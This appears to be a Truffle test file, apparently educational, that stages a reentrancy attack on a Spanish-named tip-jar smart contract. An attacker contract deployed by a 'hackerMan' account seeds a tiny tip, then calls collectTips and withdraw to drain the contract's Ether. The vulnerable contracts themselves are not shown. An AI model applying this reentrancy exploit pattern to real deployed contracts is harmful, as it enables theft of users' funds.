const Propinas = artifacts.require('./Propinas.sol');
const Atacante = artifacts.require('./Atacante.sol');

require('chai')
  .use(require('chai-as-promised'))
  .should()

contract('Reentracny attack ', accounts => {
  let propinas;
  let atacante;

  before(async () => {
    propinas = await Propinas.deployed();
    atacante = await Atacante.deployed();
  })

  describe('Attaaack', async () => {
    it.only('Should be able to steal all Ether', async () => {
      let balnce;
      const tip = 10000000000000000000;
      // Accounts alias
      const donador = accounts[1];
      const mozo = accounts[2];
      const camarera = accounts[3];
      const hackerMan = accounts[4];
      const giverA = accounts[5];
      const giverB = accounts[6];
      
      // Fresh start
      await Propinas.new(); // Accounts[0] is default for transactions

      // Initial balances are Zero 
      let initialBalanceMozo = await propinas.balanceOf(mozo);
      assert.equal(initialBalanceMozo, 0);

      let initialBalanceCamarera = await propinas.balanceOf(camarera);
      assert.equal(initialBalanceCamarera, 0);

      let initialBalanceHackerMan = await propinas.balanceOf(hackerMan);
      assert.equal(initialBalanceHackerMan, 0);

      // Give tips to employees
      await propinas.sendTip(mozo, { from: donador, value: tip}); 
      balance = await propinas.balanceOf(mozo);
      assert.equal(balance, tip);

      await propinas.sendTip(camarera, { from: donador, value: tip }); 
      balance = await propinas.balanceOf(camarera);
      assert.equal(balance, tip);

      // Give more tips to employees
      for (let i = 0; i < 13; i++) {
        await propinas.sendTip(i % 2 ? mozo: camarera, 
          { from: i % 3 ? giverA : giverB, value: tip}); 
      };


      // At some point, Hackerman gets ready to strike
      atacante = await Atacante.new( Propinas.address ,{ from: hackerMan }); 

      // AutoGive a Tip
      await propinas.sendTip(Atacante.address, { from: hackerMan, value: 10000000}); // A really small amount needed to start the attack
      initialBalanceHackerMan = await propinas.balanceOf(hackerMan);
      assert.notEqual(Atacante.address, 0);

      // Steal all 5503566
      const hackerInitialBalance = await web3.eth.getBalance(hackerMan);
      console.log('hackerInitialBalance', hackerInitialBalance);

      const attackTx = await atacante.collectTips();
      let hackerBalance = await web3.eth.getBalance(hackerMan);
      console.log(hackerBalance);

      const withdrawTx = await atacante.withdraw();
      hackerBalance = await web3.eth.getBalance(hackerMan);
      console.log(hackerBalance);

    });
  });
});